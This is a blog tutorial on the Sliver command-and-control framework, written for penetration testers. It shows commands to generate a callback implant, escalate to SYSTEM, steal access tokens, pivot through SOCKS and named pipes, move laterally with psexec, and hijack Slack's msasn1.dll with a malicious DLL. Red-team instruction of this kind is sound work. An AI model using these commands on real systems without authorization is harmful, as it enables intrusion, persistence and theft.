<!doctype html><html lang=en-us><head><title>Getting started with the Sliver C2 Framework // eversinc33</title><link rel="shortcut icon" href=/favicon.ico><meta charset=utf-8><meta name=generator content="Hugo 0.108.0"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="eversinc33"><meta name=description content><link rel=stylesheet href=https://eversinc33.github.io/css/main.min.56496327917020e2615871d48104da92f34d7c476ef1cb3f79a86ca13745a2ab.css><meta name=twitter:card content="summary"><meta name=twitter:title content="Getting started with the Sliver C2 Framework"><meta name=twitter:description content="Sliver is an open-source multi-operator command and control framework written in Go and named after a species from Magic the Gathering. It is maintained by BishopFox and offers a big feature set and a beautiful CLI.
However, I did not find much documentation on the more advanced features, except for Slivers help menu (which is excellent by the way), which is why I documented some of its features in this post."><meta property="og:title" content="Getting started with the Sliver C2 Framework"><meta property="og:description" content="Sliver is an open-source multi-operator command and control framework written in Go and named after a species from Magic the Gathering. It is maintained by BishopFox and offers a big feature set and a beautiful CLI.
However, I did not find much documentation on the more advanced features, except for Slivers help menu (which is excellent by the way), which is why I documented some of its features in this post."><meta property="og:type" content="article"><meta property="og:url" content="https://eversinc33.github.io/posts/getting-started-with-sliver/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-08-29T21:37:49+02:00"><meta property="article:modified_time" content="2022-08-29T21:37:49+02:00"></head><body><header class=app-header><a href=https://eversinc33.github.io><img class=app-header-avatar src="https://avatars.githubusercontent.com/u/51821028?v=4" alt=eversinc33></a><h1>eversinc33</h1><p>bits about malware development and penetration testing</p><div class=app-header-social><a href=https://github.com/eversinc33 target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github"><title>My Github</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://twitter.com/eversinc33 target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter"><title>My Twitter</title><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a href=https://www.linkedin.com/in/sven-rath-4212ba1b8/ target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin"><title>My linkedin</title><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a></div></header><main class=app-container><article class=post><header class=post-header><h1 class=post-title>Getting started with the Sliver C2 Framework</h1><div class=post-meta><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>Aug 29, 2022</div><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock"><title>clock</title><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>7 min read</div></div></header><div class=post-content><p><a href=https://github.com/BishopFox/sliver>Sliver</a> is an open-source multi-operator command and control framework written in Go and named after <a href=https://github.com/BishopFox/sliver/wiki#sure-but-whats-a-sliver>a species from Magic the Gathering</a>. It is maintained by BishopFox and offers a big feature set and a beautiful CLI.</p><p>However, I did not find much documentation on the more advanced features, except for Slivers <code>help</code> menu (which is excellent by the way), which is why I documented some of its features in this post. The project is still actively developed though, so the below is subject to change and may not work in future versions of the framework.</p><p>Sliver features staged and stageless payloads, implants for Windows, Linux & macOS, malleable C2 over HTTP(S) as well as C2 over mTLS, WireGuard and DNS. It also has all your basic C2 needs: execute-assembly, socks proxies, port forwarding, you name it. Additionally, an extension management system (armory) offers customization options.</p><p>IMO Sliver is a great free and open-source replacement for Cobalt Strike.</p><h2 id=setting-up-and-connecting-to-the-team-server>Setting up and connecting to the team server</h2><p>In kali, installation is straightforward via <code>apt</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>apt install sliver
</span></span></code></pre></div><p>Start the team server and you will be greeted with a Sliver banner.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sliver-server
</span></span></code></pre></div><p><img src=/sliver.png alt></p><p>Now first we have to add a new operator by creating an operator config file. These files contain authentication and connection info for your team server.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>new-operator --name eversinc33 --lhost 127.0.0.1
</span></span></code></pre></div><p>Afterwards, copy your config file to <code>~/.sliver-client/configs</code>.</p><p>Finally, enable multiplayer mode, to allow operator login:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>multiplayer
</span></span></code></pre></div><p>To connect to the server as an operator, run <code>sliver-client</code> and select your configuration file, if there are multiple.</p><p>If you have connection errors with the Sliver-client, it is likely that you forgot to run the above <code>multiplayer</code> command, as it needs to be run every time the server is started.</p><h3 id=generating-implants>Generating Implants</h3><p>There are many options for generating implants and I recommend to read through them all with <code>help generate</code>. Note that by default a <code>session</code>-implant is generated, which communicates in a real time fashion. To generate a <code>beacon</code> implant, that periodically checks back for tasks, use <code>generate beacon</code>. Staged implants can be generated with <code>generate stager</code>. All your implants can be listed with <code>implants</code> and regenerated with <code>regenerate IMPLANT_NAME</code>.</p><p>I generate the shellcode for an mTLS-based implant here. Compilation may take some time.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>generate -N IMPLANT_NAME --mtls 192.168.2.129 -f shellcode -s /tmp/sliver.bin
</span></span></code></pre></div><p>Besides <code>shellcode</code>, you can also generate an <code>exe</code>, a dynamic library (<code>shared</code>) or a <code>service</code> to use for <code>psexec</code>.</p><p>Don&rsquo;t forget to start the listener with, in this case, <code>mtls</code>.</p><p>If you then deliver and execute the payload using your favorite method, we get a connection back.</p><p><img src=/newsesh.png alt></p><h2 id=interacting-with-a-session>Interacting with a session</h2><p>We can start to interact with our agent with <code>use &lt;ID></code>. List available sessions and beacons with <code>sessions</code> and <code>beacons</code> respectively:</p><p><img src=/listsessions.png alt></p><p>Sliver has many powerful features. If you type <code>help</code> in a session, you can see a list of all of them. If you have some experience working with Cobalt Strike or meterpreter, many of them will be familiar, which makes Sliver feel quite &ldquo;natural&rdquo; and have an easy learning curve.</p><p>There are many basic commands available, such as <code>upload</code> and <code>download</code>, <code>ls</code> and <code>cd</code>, <code>cat</code>, <code>execute</code> (run any shell command), <code>netstat</code> or <code>screenshot</code>.</p><p>Below are some further examples of selected Sliver commands.</p><h2 id=commands>Commands</h2><pre tabindex=0><code>execute-assembly 
</code></pre><blockquote><p>With <code>execute-assembly</code> we can run a .NET assembly (DLL or exe) in memory, by spawning a new process (notepad by default) that hosts the .NET-CLR. With the <code>-X</code> flag, the tool output is automatically saved to <code>~/.sliver/loot</code>.</p></blockquote><blockquote><p>This can however be a bit tedious, since as of now there is no path autocompletion, but that is not that much of a problem anymore, when working with aliases (which I will explain in the next chapter below).</p></blockquote><pre tabindex=0><code>getsystem
</code></pre><blockquote><p>Spawn a new session as NT AUTHORITY/SYSTEM, by injecting into a system process when you are already in a high privileged shell.</p></blockquote><blockquote><p><img src=/getsystem.png alt></p></blockquote><pre tabindex=0><code>ps
</code></pre><blockquote><p>List processes and identify running security products such as AVs and EDRs:</p></blockquote><blockquote><p><img src=/ps.png alt></p></blockquote><pre tabindex=0><code>socks
</code></pre><blockquote><p>Sliver enables you to start a socks5 proxy in your implant with <code>socks5 start</code>. This proxy can then be used with e.g. <code>proxychains</code> to tunnel your tools through the implant into the corporate network.</p></blockquote><pre tabindex=0><code>pivots
</code></pre><blockquote><p><code>pivots</code> offers local listeners, that can link your implants to each other, either via TCP or via SMB named pipes. These pivot listeners and links help you keep your outbound traffic low. SMB blends in very well in Active Directory environments, which is why I would prefer SMB to link between machines. For local links, e.g. when you are privilege escalating and need to spawn another beacon/session, I would use TCP instead.</p></blockquote><blockquote><p>Start the pipe listener in your session/beacon and name your pipe (e.g. intercom): <code>pivots named-pipe intercom</code>. Then generate a named-pipe implant, e.g. <code>generate --named-pipe //./pipe/intercom</code>. Don&rsquo;t forget the pipe prefix here (<code>//./pipe</code>).</p></blockquote><blockquote><p>Upon launching your implant, if it can reach the other implant that will act as a pivot listener, it will link and communicate over that implant to the team server.</p></blockquote><blockquote><p><img src=/namedpipe.png alt></p></blockquote><blockquote><p>This is also really useful if your target can not directly communicate with your team server, e.g. due to a firewall blocking outbound traffic.</p></blockquote><pre tabindex=0><code>impersonate
make-token
rev2self
</code></pre><blockquote><p><code>ìmpersonate</code> and <code>make-token</code> allow you to play around with Windows access tokens. The former allows you to steal the token of another process, if you have the privileges to access it (e.g. when you are SYSTEM on a machine and want the token of another logged-in user). The latter allows you to impersonate a user by forging an access token, if you know the credentials. As the time of writing this, there is no command yet like Cobalt Strike&rsquo;s <code>kerberos_ticket_use</code>, where you can inject a kerberos ticket into your session. <code>rev2self</code> reverts the token to the original access token of that session.</p></blockquote><pre tabindex=0><code>psexec
</code></pre><blockquote><p><code>psexec</code> allows you to easily jump to another host by creating a service with psexec (duh). To do that, you need to first create an implant profile with <code>profiles new</code>, which will act as a template for the service binary that will be deployed.</p></blockquote><pre tabindex=0><code>sideload
</code></pre><blockquote><p>Load a DLL into a remote process using <a href=https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/>Shellcode Reflective DLL Injection</a>. Lets you also capture the output to the loot directory with <code>-X</code>.</p></blockquote><pre tabindex=0><code>dll-hijack
</code></pre><blockquote><p>This might be my favorite command. It allows you to specify a DLL on the host and a local DLL that will be planted on the target.It will then modify all exports so that the planted DLL forwards all relevant exports to the hijacked DLL. Optionally you can also use an implant profile to generate as the DLL.</p></blockquote><blockquote><p>E.g., hijack msasn1.dll, which is loaded by slack and supply your own DLL as the malicious replacement: <code>dll-hijack --reference-path C:\\Windows\\system32\\msasn1.dll --file /tmp/malicious.dll C:\\Users\\Bob\\AppData\\Slack\\App-4.18.0\\msasn1.dll</code>. Now slack will load your malicious DLL on startup, but functionality won&rsquo;t be impacted, because your DLL is modified to forward all calls to the original DLL.</p></blockquote><pre tabindex=0><code>msf
</code></pre><blockquote><p>Sliver offer some integration with metasploit, and as such can run MSF payloads (and inject them into remote processes with <code>msf-inject</code>) by speaking to a metasploit instance via its RPC API:</p></blockquote><blockquote><p><img src=/msf1.png alt></p></blockquote><blockquote><p>Even though it errors with an empty response, we get a meterpreter shell back:</p></blockquote><blockquote><p><img src=/msf.png alt></p></blockquote><p>Obviously those are not all commands, but rather some that I found interesting. There are many more so check them out too.</p><h2 id=extending-sliver>Extending Sliver</h2><p>Using armory, Sliver&rsquo;s built-in repository for extensions, we can easily install extensions, such as a keylogger, some Beacon-Object-Files or aliases for several well-known .NET-based tools.</p><p>Aliases are basically wrappers around <code>execute-assembly</code>. As such, instead of having to type out <code>execute-assembly /path/to/sharphound</code>, you can then simply type the name of the wrapper, e.g. here with SharpHound:</p><p><img src=/bloodhound.png alt></p><p>Aliases for your own tools can be quickly created, as they are just a <a href=https://github.com/BishopFox/sliver/blob/928faad39a07e999bb67d4d66054052387342f5c/client/command/exec/msf-inject.gos>json-file that describes the assembly</a>.</p><p>Another fun way to use armory is that your team could set up your own armory-repository, that includes your internal tooling and can be used by all operators.</p><h2 id=other-takeaways>Other takeaways</h2><ul><li>Sliver does not always take you by the hand, e.g. if you specify <code>-f dll</code> for an implant, it does not warn you that this format does not exist and that what you want to use is <code>-f shared</code>, it will just generate an .exe file.</li></ul><p>Go and play with Sliver at <a href=https://github.com/BishopFox/Sliver>https://github.com/BishopFox/Sliver</a>. Happy Hacking</p></div><div class=post-footer></div></article></main></body></html>